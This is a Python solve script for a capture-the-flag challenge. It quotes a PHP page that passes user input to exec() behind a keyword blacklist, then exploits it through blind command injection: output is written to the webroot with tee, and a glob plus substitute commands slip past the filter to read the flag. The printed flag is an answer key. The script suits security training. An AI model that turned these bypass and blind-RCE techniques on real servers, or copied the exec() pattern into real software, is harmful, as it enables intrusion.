#!/usr/bin/env python3
"""
solve-flag.py -- end-to-end replay of the node4.anna.nssctf.cn:27309 solve.

Challenge: PHP 5.6.40 / Apache 2.4.25, index.php

    <?php highlight_file(__FILE__);
    if(isset($_GET['url'])){ $url=$_GET['url'];
      if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))
        { echo "Sorry,you can't use this."; }
      else { echo "Can you see anything?"; exec($url); } }

exec() output is never echoed -> blind RCE.

Chain (all facts verified live, see recon.md / listing.txt):
  1. exec() cwd == document root /var/www/html, writable as uid=33(www-data)
     => any stdout can be shipped to the webroot with `|tee <name>.txt` and read
        back with a plain HTTP GET.   (`-` is blacklisted, so the name must not
        contain a hyphen; hence `node4r1.txt` and not `node4-1.txt`.)
  2. `dir /` reveals two root-level candidates:
        /a_here_is_a_f1ag        (16 chars, no banned substring -> typeable)
        /flllllaaaaaaggggggg     (19 chars, CONTAINS banned "la" -> untypeable)
  3. /a_here_is_a_f1ag is a decoy breadcrumb: "true_flag_1s_1n_flllllaaaaaaggggggg"
  4. the real file is reached with the single-char glob `?` substituted at the
     l|a boundary:  /fllll?aaaaaaggggggg   (same 19 chars, unique match, no "la")

Flag: NSSCTF{1ec6ae10-d171-4bee-88db-e6441c5bcd5a}

Usage:  python solve-flag.py
Exit code 0 + flag on stdout when solved.
"""
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://node4.anna.nssctf.cn:27309/"
BLOCK = re.compile(
    r'bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|-|\*|"|>|<|%|\$',
    re.I,
)
UA = {"User-Agent": "curl/7.64"}


def check(cmd: str) -> None:
    """Fail fast if the decoded command would be rejected -- offline simulation."""
    m = BLOCK.search(cmd)
    if m:
        raise SystemExit("PAYLOAD REJECTED locally on %r: %s" % (m.group(0), cmd))


def get(path: str, timeout: int = 60) -> str:
    req = urllib.request.Request(BASE + path, headers=UA)
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def tail(body: str) -> str:
    """highlight_file() prints index.php (which contains BOTH marker strings) inside
    <code>..</code>; only what follows the LAST </code> is the real echo marker."""
    i = body.rfind("</code>")
    return body[i + len("</code>"):].strip() if i != -1 else body.strip()


def run(cmd: str, outfile: str) -> str:
    """Send `?url=<cmd>`, wait, then fetch the file tee wrote into the docroot."""
    check(cmd)
    url = BASE + "?url=" + urllib.parse.quote(cmd, safe="")
    print("[>] %s" % url)
    print("[i] decoded: %s" % cmd)
    marker = tail(get("?url=" + urllib.parse.quote(cmd, safe="")))
    if "Can you see anything?" not in marker:
        raise SystemExit("BLOCKED (response tail: %r)" % marker[:120])
    time.sleep(1.0)
    data = get(outfile)
    print("[+] /%s (%d bytes)" % (outfile, len(data)))
    return data


def main() -> int:
    # 0. reachability
    try:
        head = get("")
    except Exception as e:
        raise SystemExit("target unreachable (%s: %s) -- instance may be down; "
                         "see recon.md section 7" % (type(e).__name__, e))
    print("[+] alive: %s" % BASE)

    # 1. prove the blind round trip (also confirms cwd == writable docroot)
    who = run("id|tee node4r1.txt", "node4r1.txt")
    print("    %s" % who.strip())
    assert "www-data" in who, "tee round trip did not return id output"

    # 2. ground-truth root listing
    root = run("dir /|tee r2.txt", "r2.txt")
    for line in root.splitlines():
        print("    %s" % line)

    # 3. read the breadcrumb and the real target in one round trip.
    #    /flllllaaaaaaggggggg is untypeable ("la"); /fllll?aaaaaaggggggg is the glob.
    run(
        "file /a_here_is_a_f1ag|tee f0.txt;"
        "nl /a_here_is_a_f1ag|tee f1.txt;"
        "file /fllll?aaaaaaggggggg|tee f2.txt;"
        "nl /fllll?aaaaaaggggggg|tee f3.txt",
        "f3.txt",
    )
    body = get("f3.txt")
    print("[+] /f3.txt: %s" % body.strip())

    m = re.search(r"NSSCTF\{[^}]+\}", body)
    if not m:
        raise SystemExit("no flag-shaped string in /f3.txt: %r" % body)
    print("\nFLAG: %s" % m.group(0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
